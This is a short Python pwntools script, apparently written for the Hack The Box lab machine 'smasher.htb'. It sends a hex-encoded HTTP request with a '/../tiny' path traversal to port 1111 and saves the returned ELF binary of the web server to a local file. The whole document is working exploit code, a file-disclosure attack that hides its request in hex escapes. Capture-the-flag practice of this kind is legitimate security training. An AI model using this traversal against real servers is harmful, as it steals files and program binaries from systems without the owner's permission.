from pwn import *

host,port = "smasher.htb", 1111

context.log_level = "DEBUG"

s = remote(host,port)

data = "\x47\x45\x54\x20/../tiny\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a" \
"\x48\x6f\x73\x74\x3a\x20\x73\x6d\x61\x73\x68\x65\x72\x2e\x68\x74" \
"\x62\x3a\x31\x31\x31\x31\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65" \
"\x6e\x74\x3a\x20\x63\x75\x72\x6c\x2f\x37\x2e\x35\x38\x2e\x30\x0d" \
"\x0a\x41\x63\x63\x65\x70\x74\x3a\x20\x2a\x2f\x2a\x0d\x0a\x0d\x0a"

s.sendline(data)

recv = s.recvuntil('ELF')

elf = recv[recv.find('\x7fELF'):]
try:
    while recv:
        recv = s.recv()
        elf += recv
except:
    pass

open('remote_tiny','w').write(elf)
